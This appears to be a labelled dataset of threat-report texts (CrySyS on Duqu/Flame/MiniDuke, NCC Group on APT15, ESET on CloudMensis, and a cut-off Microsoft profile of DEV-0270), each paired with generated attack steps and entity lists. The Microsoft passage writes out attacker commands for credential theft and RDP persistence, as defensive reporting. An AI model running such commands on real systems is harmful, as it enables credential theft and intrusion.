www.crysys.hu25Challenges for the attackers serial number and validity values are not controlled by theattacker – they depend on the issue time of the certificate the attackers needed to get the certificate issued at the rightmoment (matching the preset serial number and validity) – they had a 1-millisecond window to submit their query– probably large number of attempts were required questions– Did the attackers have a fast collision generation algorithm or a largecluster for computations?– Were they located close to Microsoft’s certificate server to minimizepacket jitter?Laboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu26MiniDuke (February 2013) targeted multiple government entities and human rightorganisations – governmental victims have been identified in Ukraine, Belgium,Portugal, Romania, the Czech Republic, and Ireland uses targeted pdf documents as droppers– exploits the Acrobat Reader 0-day vulnerability that was published byFireEye on February 12, 2013 drops a highly customized backdoor written in assemblylanguage – very small in size (only 20kb) and unique for all victims this backdoor uses Twitter and Google to locate C&C servers– The weather is good today. Sunny!uri!wp07VkkxYt3Mne5uiDkz4Il/Iw48Ge/EWg== downloads stage 2 and 3 codes from C&C server disguised asGIF filesLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu27Lessons learned current practice to defend systems against targeted attackshave limitations – Duqu, Flame, and MiniDuke passed signature based virus scanners– code signing did not help either• compromised signature key in case of Duqu (and Stuxnet)•fake certificate for signature verification key in case of Flame the attackers are in possession of advanced cryptographicknowledge – MD5 collision attack in Flame vigilant system administrators could detect advanced attackswith simple approaches and available tools – manual inspection of system status, resource usage, and bootlog– available rootkit detector toolsLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu28Lessons learned mainstream security products are bypassed by attackers – McAfee, TrendMicro, Sysinternals tools failed to detect Duqu andFlame– attackers can fine-tune their code until it pass mainstreamproducts information sharing is crucial for identification of droppers(and potentially 0-day exploits) – we played the role of a trusted mediator between Microsoft andthe Duqu victim– this led to efficient handling of the incident and the discovery of a0-day Windows kernel exploit– unlike in our case, security vendors are often unable to obtainforensics information even when their product detected infection• droppers of Flame?Laboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu29Challenge #1: Prevention signature based scanning does not work– assumes that AV company already detected the threat before it affects theuser– not true for targeted attacks (you may be the first and only victim) – polymorphism allows for individualized malware samples – attacker can test AV products available on the market on-the-fly dynamic analysis of behavior?– open document / download web page in closely monitored virtual machine – examples: FireEye, LastLine – problems:• malware can detect the virtualized environment • ensuring transparency is very difficult sandboxing and virtualization?– create isolated execution environments and monitor accesses through theirboundary to system resources– examples: Java VM, VMware, VirtualBox, Bromium vSentry, Qubes OS – problems:• usability, convenience, and performance issuesLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu30Challenge #2: Fast detection determined and resourceful attackers will eventually succeed incompromising any system detection of being compromised can focus on lateral movement, C&Ccommunications, and data exfiltration Security Information and Event Management (SIEM) systems?– collect and correlate event logs – raise alarms – problems:false positives• • need expert knowledge to configure properly defender can also take advantage of the home ground– can use traps and baits to mislead the attacker – examples: honeypots and honeytokens – also allow for observation of attacker activities, tools, and tactics – problems:• management of honeypots and honeytokens can be cumbersome •is this only a question of lacking good management tools?Laboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu31Challenge #3: Information asymmetryattackers have knowledge on available security tools, and they may also know the security posture of the defenderdefenders know very little about the attacker how can we decrease this asymmetry? hide some part of the security posture– custom security tools and configurations – honeypots and honeytokens could also be used here try to obtain more information about the attacker– threat intelligence gathering from different sources – client honeypotsLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu32Challenge #4: Information sharing victims of attacks are reluctant to share incident informationand forensics material – privacy issues, sensitive company related information security vendors could collect lot of information on potentialnew threats – e.g., silent detection by AV vendors, Cisco SenderBase, cloud basedprotection by SIEM vendors,  but security vendors may not want to share their collectedintelligence to preserve market advantage standards for exchange of incident data are emerging– STIX - Structured Threat Information Expression – TAXII - Trusted Automated Exchange of Indicator Information legal issues may impede data sharing– incident reports, traffic logs, DNS data include personally identifiableinformationLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu33Challenge #5: Lack of good experts a good expert– knows about old tricks and new trends in cyber attacks– knows the systems and networks he is responsible for– can use and configure available security tools– can select new security tools to buy– has time to look into the tools’ output better education, training, simulation exercises areneededLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu34Questions?Dr. Levente ButtyánCrySyS Lab, Budapestcontact info: www.crysys.huLaboratory of Cryptography and System Security CrySyS Adat- és Rendszerbiztonság Laboratórium www.crysys.hu35 "," 1. The attacker profiles and identifies specific targets of interest. 2. Customized malware is developed with info-stealing capabilities. 3. Malware is delivered via spear phishing emails, compromised sites, etc. 4. Exploits leverage vulnerabilities or fake certificates to execute malware. 5. Malware installs and persists on victim systems undetected. 6. Sensitive data like keystrokes and screenshots are captured over time. 7. Data is exfiltrated periodically to the attacker's infrastructure. 8. New versions of malware are pushed to infected hosts. 9. Defenders face challenges detecting and analyzing the malware. 10. Information sharing and collaboration helps understand the malware. ",valid_34,"['the attacker', 'files', 'Exploits', 'certificate', 'systems', 'Data', 'keystrokes', 'time', 'Defenders', 'challenges', 'the malware', '10', 'information sharing', 'collaboration']",the attacker; files; Exploits; certificate; systems; Data; keystrokes; time; Defenders; challenges; the malware; 10; information sharing; collaboration.
"New tools uncovered from hacking group APT15 RoyalCLI and RoyalDNS backdoors discovered by NCC Group NCC Group has discovered two previously unknown backdoors used by the elusive hacker group APT15, providing unique insight into its methods. The group is also known as K3chang, Mirage, Vixen Panda, GREF and Playful Dragon. The global cyber security and risk mitigation expert was able to track the movements of the group over more than a year by decoding more than 200 commands from several compromised hosts, in turn understanding how APT15 uses bespoke tools to target victims. In this instance, the attackers targeted a global company that provides multiple services to UK government. The attackers operated within the victim’s network from May 2016 until late 2017, compromising over 30 hosts during that period. APT15 were targeting information related to UK government departments and sensitive communication technology. By using the open-source tool Mimikatz, the attackers were able to gain domain administrator credentials aiding them in later stealing a VPN certiﬁcate which they used to access the victim’s network remotely. APT15 was then able to deploy three backdoors – BS2005, which has previously been documented by cyber security company FireEye, as well as RoyalCLI and RoyalDNS, which have not been discussed publically before. By looking at the reuse of this code, NCC Group researchers were able to link these backdoors to the same threat actor. The RoyalCLI backdoor is similar to BS2005 in that it uses Windows command prompt (cmd.exe) to execute most of its commands. However, by copying the default cmd.exe and patching it, RoyalCLI is able to bypass policy settings that disable running of command prompt on the host machine. In contrast, the RoyalDNS backdoor takes commands, runs them, then returns output using DNS. It diﬀers from the other two backdoors found on the victim’s network in that it installs itself persistently and communicates over DNS rather than HTTP. Once inside the victim’s network, the group was able to extract and collect information in multiple ways. The group used a tool called Comma Separated Value Data Exchange (CSVDE), which can export data in bulk from Microsoft Windows Active Directory, as well as Bulk CopyProgram (BCP), which comes with Microsoft SQL, to export data from Microsoft SQL databases. These methods were combined with bespoke tools to extract information from Microsoft Sharepoint and Microsoft Exchange. In the case of the Microsoft Sharepoint tool the binary included hard coded project names that were speciﬁc to the victim. Ahmed Zaki, senior malware researcher at NCC Group, said: “Through our investigation we were able to identify and monitor the attack process from start to ﬁnish, oﬀering us unique insight into the behaviour of this group. It’s clear to see that this is a highly sophisticated threat actor that has no problem writing tools which are speciﬁc to its victims”. “Knowledge sharing in the security industry is vital in order to improve the security posture and capabilities of the sector and UK as a whole. Discussing these types of insights is therefore necessary to ensure that we’re always able to understand and adapt to an ever-increasing variety of threats.” Published date: 10 March 2018(url CommentsNCC GroupRecommendShare⤤Start the discussion…LOG IN WITHOR SIGN UP WITH DISQUS?Login1 Sort by OldestSubscribe✉dAdd Disqus to your siteAdd DisqusAddPrivacy Filter By ServiceSoftware Escrow & VeriﬁcationCyber SecurityRisk Management & Governance CareersFilter By Date 2018 (/uk/about-us/newsroom-and-events/press-releases/?Year=2018)March (1) (/uk/about-us/newsroom-and-events/press-releases/?Year=2018&Month=3) February (1) (/uk/about-us/newsroom-and-events/press-releases/?Year=2018&Month=2) January (7) (/uk/about-us/newsroom-and-events/press-releases/?Year=2018&Month=1)2017 (/uk/about-us/newsroom-and-events/press-releases/?Year=2017) 2016 (/uk/about-us/newsroom-and-events/press-releases/?Year=2016) 2015 (/uk/about-us/newsroom-and-events/press-releases/?Year=2015) 2014 (/uk/about-us/newsroom-and-events/press-releases/?Year=2014)Call us on: +44(0)161 826 5867 (tel:+441618265867)Newsroom & Events In the media (/uk/about-us/newsroom-and-events/in-the-media/) News (/uk/about-us/newsroom-and-events/news/) Press Releases (/uk/about-us/newsroom-and-events/press-releases/) Events (/uk/about-us/newsroom-and-events/events/) Blogs (/uk/about-us/newsroom-and-events/blogs/) About Us History (/uk/about-us/what-we-do/history/)Board & Senior Management (/uk/about-us/what-we-do/board-and-executive- committee/) Careers (/uk/about-us/careers/) Resources (/uk/about-us/resources/) Oﬃce Locations (/uk/about-us/what-we-do/oﬃce-locations/) ©2018 NCC Group. All rights reserved. Investor Relations Share Price (/uk/about-us/investor-relations/share-price/) Results & Presentations (/uk/about-us/investor-relations/results-and-presentations/) Stock Exchange Announcements (/uk/about-us/investor-relations/stock-exchange- Terms & Conditions (/uk/about-us/terms-and-conditions/) Privacy Policy (/uk/about-us/privacy-policy/) Cookie Policy (/uk/about-us/privacy-policy/cookie-policy/) Accessibility (/uk/about-us/accessibility/) Sitemap (/uk/sitemap/) Latest from @NCCGroupplc (url COOK, a provider of high-quality frozen meals, suspected that slow load times were negatively aﬀecting its business. Download our case study for an in-depth analysis on how NCC Group measured and improved the performance of COOK’s website url us/resources/cook-real-user-monitoring-case-study/?resources=Case+Studies … (url Reply (url Retweet (url (url Despite the fact #GDPR (url will be enforced from May 2018, many organisations remain unclear on the topic of breach notiﬁcation under #GDPR (url For best practice advice on how to communicate a personal data breach download our ebook now url breach-notiﬁcation-under-gdpr-how-to-communicate-a-personal-data-breach/? research=Whitepapers … (url Reply (url Retweet (url (urlFavorite "," 1. APT15 gains initial access, perhaps through phishing. 2. Mimikatz used to steal credentials and certificates. 3. RoyalCLI, RoyalDNS, BS2005 backdoors deployed. 4. Backdoors receive commands from C&C servers. 5. Windows tools like BCP and CSVDE used to extract documents and data. 6. Stolen VPN certificate provides persistent access even after remediation attempts. ",valid_11,"['APT15', 'Mimikatz', 'us', 'credentials', 'RoyalCLI', 'RoyalDNS', 'BS2005', 'Backdoors', 'commands', 'Windows', 'tools', 'BCP', 'CSVDE', 'data', 'VPN']",APT15; Mimikatz; us; credentials; RoyalCLI; RoyalDNS; BS2005; Backdoors; commands; Windows; tools; BCP; CSVDE; data; VPN.
"www.welivesecurity.com /2022/07/19/i-see-what-you-did-there-look-cloudmensis-macos-spyware/ I see what you did there: A look at the CloudMensis macOS spyware ⋮ 7/19/2022Previously unknown macOS malware uses cloud storage as its C&C channel and to exfiltrate documents, keystrokes, and screen captures from compromised MacsMarc-Etienne M.Léveillé 19 Jul 2022 - 11:30AMPreviously unknown macOS malware uses cloud storage as its C&C channel and to exfiltrate documents, keystrokes, and screen captures from compromised MacsIn April 2022, ESET researchers discovered a previously unknown macOS backdoor that spies on users of the compromised Mac and exclusively uses public cloud storage services to communicate back and forth with its operators. Following analysis, we named it CloudMensis. Its capabilities clearly show that the intent of its operators is to gather information from the victims’ Macs by exfiltrating documents, keystrokes, and screen captures.Apple has recently acknowledged the presence of spyware targeting users of its products and is previewing Lockdown Mode on iOS, iPadOS and macOS, which disables features frequently exploited to gain code execution and deploy malware. Although not the most advanced malware, CloudMensis may be one of the reasons some users would want to enable this additional defense. Disabling entry points, at the expense of a less fluid user experience, sounds like a reasonable way to reduce the attack surface.This blogpost describes the different components of CloudMensis and their inner workings. CloudMensis overview1/14CloudMensis is malware for macOS developed in Objective-C. Samples we analyzed are compiled for both Intel and Apple silicon architectures. We still do not know how victims are initially compromised by this threat. However, we understand that when code execution and administrative privileges are gained, what follows is a two-stage process (see Figure 1), where the first stage downloads and executes the more featureful second stage. Interestingly, this first-stage malware retrieves its next stage from a cloud storage provider. It doesn’t use a publicly accessible link; it includes an access token to download the MyExecute file from the drive. In the sample we analyzed, pCloud was used to store and deliver the second stage.Figure 1. Outline of how CloudMensis uses cloud storage servicesArtifacts left in both components suggest they are called execute and Client by their authors, the former being the downloader and the latter the spy agent. Those names are found both in the objects’ absolute paths and ad hoc signatures.2/14Figure 2. Partial strings and code signature from the downloader component, executeFigure 3. Partial strings and code signature from the spy agent component, Client3/14Figures 2 and 3 also show what appear to be internal names of the components of this malware: the project seems to be called BaD and interestingly resides in a subdirectory named LeonWork. Further, v29 suggests this sample is version 29, or perhaps 2.9. This version number is also found in the configuration filename. The downloader componentThe first-stage malware downloads and installs the second-stage malware as a system-wide daemon. As seen in Figure 4, two files are written to disk:1. /Library/WebServer/share/httpd/manual/WindowServer: the second-stage Mach-O executable, obtained fromthe pCloud drive2. /Library/LaunchDaemons/.com.apple.WindowServer.plist: a property list file to make the malware persist as asystem-wide daemonAt this stage, the attackers must already have administrative privileges because both directories can only be modified by the root user.Figure 4. CloudMensis downloader installing the second stageCleaning up after usage of a Safari exploitThe first-stage component includes an interesting method called removeRegistration that seems to be present to clean up after a successful Safari sandbox escape exploit. A first glance at this method is a bit puzzling considering that the things it does seem unrelated: it deletes a file called root from the EFI system partition (Figure 5), sends an XPC message to speechsynthesisd (Figure 6), and deletes files from the Safari cache directory. We initially thought the purpose of removeRegistration was to uninstall previous versions of CloudMensis, but further research showed that these files are used to launch sandbox and privilege escalation exploits from Safari while abusing four vulnerabilities. These vulnerabilities were discovered and well documented by Niklas Baumstark and Samuel Groß in 2017. All four were patched by Apple the same year, so this distribution technique is probably not used to install CloudMensis anymore. This could explain why this code is no longer called. It also suggests that CloudMensis may have been around for many years.4/14Figure 5. Decompiled code showing CloudMensis mounting the EFI partitionFigure 6. Sending an XPC message to speechsynthesisd The spy agent componentThe second stage of CloudMensis is a much larger component, packed with a number of features to collect information from the compromised Mac. The intention of the attackers here is clearly to exfiltrate documents, screenshots, email attachments, and other sensitive data.CloudMensis uses cloud storage both for receiving commands from its operators and for exfiltrating files. It supports three different providers: pCloud, Yandex Disk, and Dropbox. The configuration included in the analyzed sample contains authentication tokens for pCloud and Yandex Disk.ConfigurationOne of the first things the CloudMensis spy agent does is load its configuration. This is a binary structure that is 14,972 bytes long. It is stored on disk at ~/Library/Preferences/com.apple.iTunesInfo29.plist, encrypted using a simple XOR with a generated key (see the Custom encryption section).If this file does not already exist, the configuration is populated with default values hardcoded in the malware sample. Additionally, it also tries to import values from what seem to be previous versions of the CloudMensis configuration at:~/Library/Preferences/com.apple.iTunesInfo28.plist ~/Library/Preferences/com.apple.iTunesInfo.plistThe configuration contains the following:5/14Which cloud storage providers to use and authentication tokens A randomly generated bot identifier Information about the Mac Paths to various directories used by CloudMensis File extensions that are of interest to the operatorsThe default list of file extensions found in the analyzed sample, pictured in Figure 7, shows that operators are interested in documents, spreadsheets, audio recordings, pictures, and email messages from the victims’ Macs. The most uncommon format is perhaps audio recordings using the Adaptive Multi-Rate codec (using the .amr and .3ga extensions), which is specifically designed for speech compression. Other interesting file extensions in this list are .hwp and .hwpx files, which are documents for Hangul Office (now Hancom Office), a popular word processor among Korean speakers.Figure 7. File extensions found in the default configuration of CloudMensisCustom encryptionCloudMensis implements its own encryption function that its authors call FlowEncrypt. Figure 8 shows the disassembled function. It takes a single byte as a seed and generates the rest of the key by performing a series of operations on the most recently generated byte. The input is XORed with this keystream. Ultimately the current byte’s value will be the same as one of its previous values, so the keystream will loop. This means that even though the cipher seems complex, it can be simplified to an XOR with a static key (except for the first few bytes of the keystream, before it starts looping).6/14Figure 8. Disassembled FlowEncrypt methodBypassing TCCSince the release of macOS Mojave (10.14) in 2018, access to some sensitive inputs, such as screen captures, cameras, microphones and keyboard events, are protected by a system called TCC, which stands for Transparency, Consent, and Control. When an application tries to access certain functions, macOS prompts the user whether the request from the application is legitimate, who can grant or refuse access. Ultimately, TCC rules are saved into a database on the Mac. This database is protected by System Integrity Protection (SIP) to ensure that only the TCC daemon can make any changes.CloudMensis uses two techniques to bypass TCC (thus avoiding prompting the user), thereby gaining access to the screen, being able to scan removable storage for documents of interest, and being able to log keyboard events. If SIP is disabled, the TCC database (TCC.db) is no longer protected against tampering. Thus, in this case CloudMensis add entries to grant itself permissions before using sensitive inputs. If SIP is enabled but the Mac is running any version of macOS Catalina earlier than 10.15.6, CloudMensis will exploit a vulnerability to make the TCC daemon (tccd) load a database CloudMensis can write to. This vulnerability is known as CVE-2020–9934 and was reported and described by Matt Shockley in 2020.The exploit first creates a new database under ~/Library/Application Support/com.apple.spotlight/Library/Application Support/com.apple.TCC/ unless it was already created, as shown in Figure 9.7/14Figure 9. Checking it the illegitimate TCC database file already existsThen, it sets the HOME environment variable to ~/Library/Application Support/com.apple.spotlight using launchctl setenv, so that the TCC daemon loads the alternate database instead of the legitimate one. Figure 10 shows how it is done using NSTask.Figure 10. Mangling the HOME environment variable used by launchd with launchctl and restarting tccdCommunication with the C&C serverTo communicate back and forth with its operators, the CloudMensis configuration contains authentication tokens to multiple cloud service providers. Each entry in the configuration is used for a different purpose. All of them can use any provider supported by CloudMensis. In the analyzed sample, Dropbox, pCloud, and Yandex Disk are supported.The first store, called CloudCmd by the malware authors according to the global variable name, is used to hold commands transmitted to bots and their results. Another, which they call CloudData, is used to exfiltrate information from the compromised Mac. A third one, which they call CloudShell, is used for storing shell command output. However, this last one uses the same settings as CloudCmd.Before it tries fetching remote files, CloudMensis first uploads an RSA-encrypted report about the compromised Mac to /January/ on CloudCmd. This report includes shared secrets such as a bot identifier and a password to decrypt to- be-exfiltrated data.Then, to receive commands, CloudMensis fetches files under the following directory in the CloudCmd storage: /Febrary/<bot_id>/May/. Each file is downloaded, decrypted, and dispatched to the AnalizeCMDFileName method.8/14Notice how both February and Analyze are spelled incorrectly by the malware authors.The CloudData storage is used to upload larger files requested by the operators. Before the upload, most files are added to a password-protected ZIP archive. Generated when CloudMensis is first launched, the password is kept in the configuration, and transferred to the operators in the initial report.CommandsThere are 39 commands implemented in the analyzed CloudMensis sample. They are identified by a number between 49 and 93 inclusive, excluding 57, 78, 87, and 90 to 92. Some commands require additional arguments. Commands allow the operators to perform actions such as:Change values in the CloudMensis configuration: cloud storage providers and authentication tokens, file extensions deemed interesting, polling frequency of cloud storage, etc. List running processes Start a screen capture List email messages and attachments List files from removable storage Run shell commands and upload output to cloud storage Download and execute arbitrary filesFigure 11 shows command with identifier 84, which lists all jobs loaded by launchd and uploads the results now or later, depending on the value of its argument.9/14Figure 11. Command 84 runs launchctl list to get launchd jobsFigure 12 shows a more complex example. Command with identifier 60 is used to launch a screen capture. If the first argument is 1, the second argument is a URL to a file that will be downloaded, stored, and executed by startScreenCapture. This external executable file will be saved as windowserver in the Library folder of FaceTime’s sandbox container. If the first argument is zero, it will launch the existing file previously dropped. We could not find samples of this screen capture agent.10/14Figure 12. Command 60: Start a screen captureIt’s interesting to note that property list files to make launchd start new processes, such as com.apple.windowServer.plist, are not persistent: they are deleted from disk after they are loaded by launchd. Metadata from cloud storageMetadata from the cloud storages used by CloudMensis reveals interesting details about the operation. Figure 13 shows the tree view of the storage used by CloudMensis to send the initial report and to transmit commands to the bots as of April 22nd, 2022.11/14Figure 13. Tree view of the directory listing from the CloudCmd storageThis metadata gave partial insight into the operation and helped draw a timeline. First, the pCloud accounts were created on January 19th, 2022. The directory listing from April 22nd shows that 51 unique bot identifiers created subdirectories in the cloud storage to receive commands. Because these directories are created when the malware is first launched, we can use their creation date to determine the date of the initial compromise, as seen in Figure 14.12/14Figure 14. Subdirectory creation dates under /Febrary (sic)This chart shows a spike of compromises in early March 2022, with the first being on February 4th. The last spike may be explained by sandboxes running CloudMensis, once it was uploaded to VirusTotal. ConclusionCloudMensis is a threat to Mac users, but its very limited distribution suggests that it is used as part of a targeted operation. From what we have seen, operators of this malware family deploy CloudMensis to specific targets that are of interest to them. Usage of vulnerabilities to work around macOS mitigations shows that the malware operators are actively trying to maximize the success of their spying operations. At the same time, no undisclosed vulnerabilities (zero-days) were found to be used by this group during our research. Thus, running an up-to-date Mac is recommended to avoid, at least, the mitigation bypasses.We still do not know how CloudMensis is initially distributed and who the targets are. The general quality of the code and lack of obfuscation shows the authors may not be very familiar with Mac development and are not so advanced. Nonetheless a lot of resources were put into making CloudMensis a powerful spying tool and a menace to potential FilesSHA-1FilenameD7BF702F56CA53140F4F03B590E9AFCBC83809DB mdworker3 0AA94D8DF1840D734F25426926E529588502BC08 WindowServer, C3E48C2A2D43C752121E55B909FC705FE4FDAEF6 WindowServer,myexeMyExecuteDescription (Client)ESET detectionnameOSX/CloudMensis.AOSX/CloudMensis.AOSX/CloudMensis.APublic key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsGRYSEVvwmfBFNBjOz+Q13/14pax5rzWf/LT/yFUQA1zrA1njjyIHrzphgc9tgGHs/7tsWp8e5dLkAYsVGhWAPsjy 1gx0drbdMjlTbBYTyEg5Pgy/5MsENDdnsCRWr23ZaOELvHHVV8CMC8Fu4Wbaz80L Ghg8isVPEHC8H/yGtjHPYFVe6lwVr/MXoKcpx13S1K8nmDQNAhMpT1aLaG/6Qijh W4P/RFQq+Fdia3fFehPg5DtYD90rS3sdFKmj9N6MO0/WAVdZzGuEXD53LHz9eZwR -----END PUBLIC KEY-----Paths used/Library/WebServer/share/httpd/manual/WindowServer /Library/LaunchDaemons/.com.apple.WindowServer.plist ~/Library/Containers/com.apple.FaceTime/Data/Library/windowserver ~/Library/Containers/com.apple.Notes/Data/Library/.CFUserTextDecoding ~/Library/Containers/com.apple.languageassetd/loginwindow ~/Library/Application Support/com.apple.spotlight/Resources_V3/.CrashRepMITRE ATT&CK techniquesThis table was built using version 11 of the MITRE ATT&CK framework.TacticIDNameDescriptionPersistence T1543.004Defense EvasionT1553Create or Modify System Subvert Trust Controls CloudMensis tries to bypass TCC if possible.The CloudMensis downloader installs the second stage as a system-wide daemon.T1560.002 Archive Collected Data:Archive via LibraryArchive Collected Data: Archive via Library CloudMensis uses SSZipArchive to create a password-protected ZIP archive of data to exfiltrate. CloudMensis can capture and exfiltrate keystrokes. CloudMensis can take screen captures and exfiltrate them.T1056.001 Input Capture: Data from Local System CloudMensis looks for files with specific extensions. T1005 Data from Removable T1114.001 Email Collection: LocalCloudMensis can search removable media for interesting files upon their connection. CloudMensis searches for interesting email messages and attachments from Mail. The CloudMensis initial report is encrypted with a public RSA-2048 key. CloudMensis encrypts exfiltrated files using password- protected ZIP archives. CloudMensis uses Dropbox, pCloud, or Yandex Drive for C&C communication.CloudMensis exfiltrates files to Dropbox, pCloud, or Yandex Drive.14/14CollectionCommand and ControlT1573.002Email Collection CryptographyT1573.001 Encrypted Channel:T1102.002Exfiltration T1567.002Symmetric Cryptography Exfiltration Over Web Service: Exfiltration to Cloud Storage ","1. The first stage malware is executed on the victim's system and downloads the second stage from cloud storage using an access token. 2. The second stage malware installs itself as a persistent system-wide daemon. 3. CloudMensis loads its encrypted configuration file containing tokens for cloud storage C2 and file extensions to collect. 4. It bypasses macOS privacy controls like TCC to access the screen, keyboard, and removable media. 5. CloudMensis exfiltrates documents, screenshots, keystrokes, and other files by archiving and encrypting them before uploading to cloud storage. 6. The operators can send commands to the malware via the cloud storage C2 channel to control its actions on the victim system. ",valid_77,"['the first stage', 'execute', 'Download', 'the second stage', 'an access', 'itself', 'CloudMensis', 'tokens', 'C2', 'file extensions', 'macOS', 'Control', 'TCC', 'the screen', 'keyboard', 'removable media', 'documents', 'screenshots', 'keystrokes', 'files', 'the operators', 'commands', 'the malware', 'the cloud storage', 'actions']",the first stage; execute; Download; the second stage; an access; itself; CloudMensis; tokens; C2; file extensions; macOS; Control; TCC; the screen; keyboard; removable media; documents; screenshots; keystrokes; files; the operators; commands; the malware; the cloud storage; actions.
"www.microsoft.com /security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/ Profiling DEV-0270: PHOSPHORUS’ ransomware operations ⋮ 9/7/2022Microsoft threat intelligence teams have been tracking multiple ransomware campaigns and have tied these attacks to DEV-0270, also known as Nemesis Kitten, a sub-group of Iranian actor PHOSPHORUS. Microsoft assesses with moderate confidence that DEV-0270 conducts malicious network operations, including widespread vulnerability scanning, on behalf of the government of Iran. However, judging from their geographic and sectoral targeting, which often lacked a strategic value for the regime, we assess with low confidence that some of DEV-0270’s ransomware attacks are a form of moonlighting for personal or company- specific revenue generation. This blog profiles the tactics and techniques behind the DEV- 0270/PHOSPHORUS ransomware campaigns. We hope this analysis, which Microsoft is using to protect customers from related attacks, further exposes and disrupts the expansion of DEV-0270’s operations.DEV-0270 leverages exploits for high-severity vulnerabilities to gain access to devices and is known for the early adoption of newly disclosed vulnerabilities. DEV-0270 also extensively uses living-off-the-land binaries (LOLBINs) throughout the attack chain for discovery and credential access. This extends to its abuse of the built-in BitLocker tool to encrypt files on compromised devices.In some instances where encryption was successful, the time to ransom (TTR) between initial access and the ransom note was around two days. The group has been observed demanding USD 8,000 for decryption keys. In addition, the actor has been observed pursuing other avenues to generate income through their operations. In one attack, a victim organization refused to pay the ransom, so the actor opted to post the stolen data from the organization for sale packaged in an SQL database dump.Using these observations, this blog details the group’s tactics and techniques across its end-to-end attack chain to help defenders identify, investigate, and mitigate attacks. We also provide extensive hunting queries designed to surface stealthy attacks. This blog also includes protection and hardening guidance to help organizations increase resilience against these and similar attacks.Figure 1. Typical DEV-0270 attack chainWho is DEV-0270?1/10Microsoft assesses that DEV-0270 is operated by a company that functions under two public aliases: Secnerd (secnerd[.]ir) and Lifeweb (lifeweb[.]ir). We have observed numerous infrastructure overlaps between DEV- 0270 and Secnerd/Lifeweb. These organizations are also linked to Najee Technology Hooshmand (ﯽﺟﺎﻧ ﺪﻨﻤﺷﻮﻫ یژﻮﻟﻮﻨﮑﺗ), located in Karaj, Iran.The group is typically opportunistic in its targeting: the actor scans the internet to find vulnerable servers and devices, making organizations with vulnerable and discoverable servers and devices susceptible to these attacks.As with any observed nation state actor activity, Microsoft directly notifies customers that have been targeted or compromised, providing them with the information they need to secure their accounts. Microsoft uses DEV- #### designations as a temporary name given to an unknown, emerging, or a developing cluster of threat activity, allowing Microsoft Threat Intelligence Center (MSTIC) to track it as a unique set of information until we reach a high confidence about the origin or identity of the actor behind the activity. Once it meets the criteria, a DEV is converted to a named actor. Observed actor activity Initial accessIn many of the observed DEV-0270 instances, the actor gained access by exploiting known vulnerabilities in Exchange or Fortinet (CVE-2018-13379). For Exchange, the most prevalent exploit has been ProxyLogon— this highlights the need to patch high-severity vulnerabilities in internet-facing devices, as the group has continued to successfully exploit these vulnerabilities even recently, well after updates supplied the fixes. While there have been indications that DEV-0270 attempted to exploit Log4j 2 vulnerabilities, Microsoft has not observed this activity used against customers to deploy ransomware.DiscoveryUpon gaining access to an organization, DEV-0270 performs a series of discovery commands to learn more about the environment. The command wmic computersystem get domain obtains the target’s domain name. The whoami command displays user information and net user command is used to add or modify user accounts. For more information on the accounts created and common password phrases DEV-0270 used, refer to the Advanced Hunting section.wmic computersystem get domain whoami net userOn the compromised Exchange server, the actor used the following command to understand the target environment. Get-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress | ft -hidetableheadersFor discovery of domain controllers, the actor used the following PowerShell and WMI command.2/10Credential accessDEV-0270 often opts for a particular method using a LOLBin to conduct their credential theft, as this removes the need to drop common credential theft tools more likely to be detected and blocked by antivirus and endpoint detection and response (EDR) solutions. This process starts by enabling WDigest in the registry, which results in passwords stored in cleartext on the device and saves the actor time by not having to crack a password hash. ""reg"" add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /fThe actor then uses rundll32.exe and comsvcs.dll with its built-in MiniDump function to dump passwords from LSASS into a dump file. The command to accomplish this often specifies the output to save the passwords from LSASS. The file name is also reversed to evade detections (ssasl.dmp):PersistenceTo maintain access in a compromised network, the DEV-0270 actor adds or creates a new user account, frequently named DefaultAccount with a password of P@ssw0rd1234, to the device using the command net user /add. The DefaultAccount account is typically a pre-existing account set up but not enabled on most Windows systems.The attacker then modifies the registry to allow remote desktop (RDP) connections for the device, adds a rule in the firewall using netsh.exe to allow RDP connections, and adds the user to the remote desktop users group: ""reg"" add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v TSEnabled /t REG_DWORD /d 1 /f ""reg"" add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 ""reg"" add ""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP- Tcp"" /v UserAuthentication /t REG_DWORD ""netsh"" advfirewall firewall add rule name=""Terminal Server"" dir=in action=allow protocol=TCP localport=3389Scheduled tasks are one of the recurrent methods used by DEV-0270 in their attacks to maintain access to a device. Generally, the tasks load via an XML file and are configured to run on boot with the least privilege to launch a .bat via the command prompt. The batch file results in a download of a renamed dllhost.exe, a reverse proxy, for maintaining control of the device even if the organization removes the file from the device.3/10Figure 2. Scheduled task used in DEV-0270 attacks4/10Privilege escalationDEV-0270 can usually obtain initial access with administrator or system-level privileges by injecting their web shell into a privileged process on a vulnerable web server. When the group uses Impacket’s WMIExec to move to other systems on the network laterally, they are typically already using a privileged account to run remote commands. DEV-0270 also commonly dumps LSASS, as mentioned in the credential access section, to obtain local system credentials and masquerade as other local accounts which might have extended privileges.Another form of privilege escalation used by DEV-0270 involves the creation or activation of a user account to provide it with administrator privileges. DEV-0270 uses powershell.exe and net.exe commands to create or enable this account and add it to the administrators’ group for higher privileges.Defense evasionDEV-0270 uses a handful of defensive evasion techniques to avoid 